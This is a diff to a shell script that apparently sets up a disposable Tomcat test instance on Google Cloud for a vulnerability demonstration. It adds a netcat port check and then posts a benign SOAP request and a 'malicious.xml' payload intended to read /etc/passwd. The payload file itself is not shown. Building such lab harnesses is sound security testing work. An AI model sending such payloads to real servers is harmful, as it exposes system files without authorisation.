@@ -115,12 +115,12 @@ gcloud compute instances create "attack-4-tomcat" \
   --image-project "ubuntu-os-cloud" \
   --boot-disk-size "10GB" \
   --tags "http-server,https-server,lb-health-check,attack-4-tomcat" \
-  --metadata-from-file startup-script=attack-4-tomcat/startup-script.sh \
+  --metadata-from-file startup-script=startup-script.sh \
   --metadata google-compute-default-timeout=600 \
   --maintenance-policy=TERMINATE \
   --provisioning-model=STANDARD \
   --instance-termination-action=DELETE \
-  --max-run-duration=600s
+  --max-run-duration=300s
 
 # Get the external IP of the created instance
 eip=$(gcloud compute instances describe "attack-4-tomcat" \
@@ -129,17 +129,34 @@ eip=$(gcloud compute instances describe "attack-4-tomcat" \
 
 echo "External IP Address: $eip"
 
+# Install Netcat (openbsd version recommended)
+echo "Installing Netcat (openbsd)..."
+sudo apt-get update
+sudo apt-get install -y netcat-openbsd
 
-echo "Waiting 5 minutes for server to setup. Then starting testing the vulnerability."
+# Verify Netcat installation
+if ! command -v nc &> /dev/null; then
+    echo "Netcat installation failed. Exiting."
+    exit 1
+fi
 
-sleep 300
+echo "Netcat installed successfully."
 
-echo "Testing with Hello World \n"
+# Wait until port 80 is available
+echo "Waiting for port 80 to be live..."
+while ! nc -zv $eip 80 2>/dev/null; do
+  echo "Port 80 not live yet. Retrying in 5 seconds..."
+  sleep 5
+done
+
+echo "Port 80 is live! Proceeding with tests."
+
+# Testing with Hello World
+echo "Testing with Hello World..."
 curl -X POST -H "Content-Type: application/xml" --data @simple.xml http://$eip/SOAPService
 
-sleep 5
-
-echo "\n Fetching contents of etc/passwd file\n"
+# Testing with malicious payload
+echo "Fetching contents of /etc/passwd file..."
 curl -X POST -H "Content-Type: application/xml" --data @malicious.xml http://$eip/SOAPService
 ```
 
